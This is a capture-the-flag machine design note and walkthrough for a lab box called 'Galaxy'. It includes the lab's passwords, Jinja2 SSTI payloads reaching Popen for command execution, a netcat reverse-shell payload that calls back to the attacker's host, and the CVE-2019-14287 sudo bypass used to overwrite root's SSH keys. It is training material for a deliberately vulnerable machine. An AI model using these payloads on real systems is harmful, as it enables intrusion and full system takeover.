# [Galaxy]

## Introduction

This machine inspired from this bug bounty report: https://hackerone.com/reports/125980<br>
Galaxy is medium level machine with SSTI vulnerability and CVE-2019-14287 for root part. I suggest medium because getting shell is not straight forward it requires enumeration to get rce via SSTI, however players can do that by googling about SSTI. Player will learn about Popen subclassess and running multiple commands.
## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| web | Ab401c |
| root  | 1roots |

### Key Processes

1) SSH server on 22 port
2) Apache2 server on 80 port which is restricted page vulnerable to SSTI
3) After enumerating subclasses in SSTI players need to find number of Popen subclass
4) For root privilege escalation I set CVE-2019-14287 it is from real world and I believe it suits to box story
5) There is other user besides `web` and `root` (john,mathew,lily) and this is dummy user which has no password. I set them for box story and player needs to critical thinking to get shell after finding out CVE-2019-14287

### Automation / Crons
There is no automation

### Firewall Rules

There is no firewall rule

### Docker

There is no docker

### Other

1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>


# Writeup

# Enumeration

We begin enumeration with nmap tools from ports of target:<br>
`sudo nmap -sC -sV 192.168.2.110 -p- --min-rate=1000 -T4`<br>
`-sC` This flag for basic scripting<br>
`-sV` This flag for to check version<br>
`-p-` To check all ports we do not want to miss any<br>
`-T4` This flag to make scaning slightly faster (default -T3 when you don't specify)<br>
`--min-rate=1000` This is minimum rate of nmap packets<br>

![image](https://github.com/user-attachments/assets/0ceb7925-bc85-46b2-a07c-a15b77d72ce6)

We can see there are 22 and 80 port open. Website has galaxy.htb domain we need to add that domain with it's IP to our /etc/hosts file :<br>
```
echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
```
Website looks like blog about cosmos and it is in beta version
<br>
<br>
![image](https://github.com/user-attachments/assets/402a2623-84b0-4d82-97a7-1fbe5681ee21)

Let's enumerate directories and subdirectories using ffuf tool:<br>
```
ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
<br>
We find some directories one of them /developers worth to pay attention<br>

![image](https://github.com/user-attachments/assets/0f004ee2-4c74-499e-9abd-0e563c7fc92c)

Searching other subdirectories we didn't find anything usefull<br>

Let's try file inclusion with `http://galaxy.htb/developers/../../../etc/passwd` payload<br>
![image](https://github.com/user-attachments/assets/41a65f0e-d568-4238-9040-fcdf0605a18f)
<br>
There is no directory traversal or file inclusion vulnerability, but interesting thing whatever we write to url it get reflected in web page:<br>
![image](https://github.com/user-attachments/assets/67c68efa-f06b-48af-bf00-cbc3bbbf3b8e)<br>

After injecting:
````
http://galaxy.htb/developers{{7+7}}
````
We can confirm there is SSTI vulnerability
![image](https://github.com/user-attachments/assets/a1acf1be-c195-44e9-9ce4-dae252c2c3cb)

We need to know what template used, for that we use this formula:
![image](https://github.com/user-attachments/assets/14e9e059-81f0-45e6-b9bc-596ef8774d92)
<br>
Payload: `{{7*'7'}}`<br>
![image](https://github.com/user-attachments/assets/04e4f93b-c880-48a3-9114-ecdbbb3483cc)

# Foothold

## Enumeration

After searching from [blogs](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and [PayloadAllThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com) we need to find `Popen` class for rce<br>

1) First we need to find all classes<br>
Payload: `{{''.__class__.mro()[1].__subclasses__()}}`
![image](https://github.com/user-attachments/assets/13d038bf-dbeb-44c0-8ff9-b575a2854b30)
<br>
We have hundreds of classes including `Popen` which we will use for command execution

2) We need to find it's number for that we copy all of them paste it to `vi` then hit `ESC` and type: `:%s />/\r/g` and finally use `set number` command to sort them with numbers
![image](https://github.com/user-attachments/assets/bab7a081-9157-44d8-8411-e5240b4b7da1)

After using `set number` command inside `vi` we will search `Popen`:<br>
`/Popen`
![image](https://github.com/user-attachments/assets/01372a62-a9e4-4a53-908f-6b521672c66a)
We can see it is in number 259, but in programming language number starts from `0` so it should be 258.
<br>
<br>
To confirm we use this payload: `{{''.__class__.mro()[1].__subclasses__()[258]}}`
<br>
![image](https://github.com/user-attachments/assets/221e32ef-e141-406f-a02e-fd4a06b653de)

Next thing we need to use that process to gain command execution.
Payload: `{{''.__class__.mro()[1].__subclasses__()[258]('id')}}`
![image](https://github.com/user-attachments/assets/dfbcb7af-07d5-4905-bf43-61ad0b870f7f)
Instead we get this error, let's try understand what is happening
<br>
We can use python in terminal to simulate similar situation:
![image](https://github.com/user-attachments/assets/b182b2fe-ae1c-4523-8f70-6fbb7c44a9e8)
In terminal we can execute command, but we still get `<Popen: returncode: None args: 'id'>` message and it freezes<br>
Problem is `Popen` needs `.communicate()` and `stdout=-1` commands to get proper output. Read [this](https://forums.linuxmint.com/viewtopic.php?t=356930) documentation
for more
<br>
Final payload:
````
{{''.__class__.mro()[1].__subclasses__()[258]('id',stdout=-1).communicate()}}
````
![image](https://github.com/user-attachments/assets/83cc0bef-8161-458e-9b05-81a2361238cb)

Now we got response!

## Important
subprocess.Popen and shell works differently. In Popen class you can't just type multiple commands like: "uname -a" or "cat /etc/passwd"
<br>
You need `shell=True` or you need to type independently like: `(['cat','/etc/passwd'])`
![image](https://github.com/user-attachments/assets/8b433d41-c7c7-4525-8b15-eb4aae4bad48)

Lastly to get shell we will use this payload:
````
{{''.__class__.mro()[1].__subclasses__()[258](['nc','192.168.X.X','9001','-e','/bin/bash'],stdout=-1).communicate()}}
````
Don't forget to set netcat listener!

![image](https://github.com/user-attachments/assets/dec24d30-6acd-4314-b8fb-8aa18547f04d)

We got shell. Let's use ssh to get better shell<br>
We copy our public key to /home/web/.ssh/authorized_keys:
```
echo "your id_rsa.pub key" > /home/web/.ssh/authorized_keys
```
If you don't have generate using: `ssh-keygen -t rsa`<br>
After that we can login using our own private key located in /home/your_username/.ssh:
````
ssh -i id_rsa web@galaxy.htb
````
![image](https://github.com/user-attachments/assets/78d55493-9b75-416b-a3e8-91a59efb9a07)


# Privilege Escalation
There is README.txt file let's read it!
````
Dear developers!

We have ongoing "star map" project! We need to finish it as far as possible. 
User john has codes in his home directory start from these codes, but I can not disclose password of any user.
However all developers allowed to copy and paste project codes from devs directory of all user
Please do not store sensitive information in all /home/*/devs directory

Available codes:
/home/john/devs/star-map.js
/home/john/devs/star.html
/home/john/devs/stars.js
````
According to message we can copy everything from all /home/*/devs directory, we can confirm it by sudo rules:
![image](https://github.com/user-attachments/assets/0fbcccbc-5c5b-4f79-91a3-334bb8144862)
<br>So conlusion is we can copy anything from all devs directory of each user.<br>
Unfortunately we can not do it as root because of `(ALL, !root)` 
Searching other file and permission leads to nothing, after a long search we can find `sudo` uses outdated version which is vulnerable to CVE-2019-14287.
````
$ sudo --version
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
````
According to this [exploit](https://www.exploit-db.com/exploits/47502) we can bypass `!root`  by using `-u#-1` id as a result vulnerable sudo reads it as `0` which is root user
<br>
So what we have so far:<br>
We can bypass `!root` restriction<br>
We only can use `cp` from `/home/*/devs` to anywhere
<br>
<br>
We can copy pubic key of `web` user to the   `/root/.ssh/authorized_keys` locaton as a result we can use ssh without password<br>
Let's first copy our public key to the `devs` directory:
````
cp /home/web/.ssh/id_rsa.pub /home/web/devs/key
````
Then we will copy that public key from  `devs` directory to the `/root/.ssh/authorized_key`:
````
$ sudo -u#-1 cp /home/web/devs/key /root/.ssh/authorized_keys 
$ ssh -i /home/web/.ssh/id_rsa root@192.168.0.110
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Feb 21 10:47:28 AM UTC 2025

  System load:  0.0               Processes:               109
  Usage of /:   44.8% of 7.79GB   Users logged in:         1
  Memory usage: 10%               IPv4 address for enp0s3: 192.168.0.110
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

16 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Fri Feb 21 10:30:09 2025 from 192.168.0.110
root@galaxy:~#
````

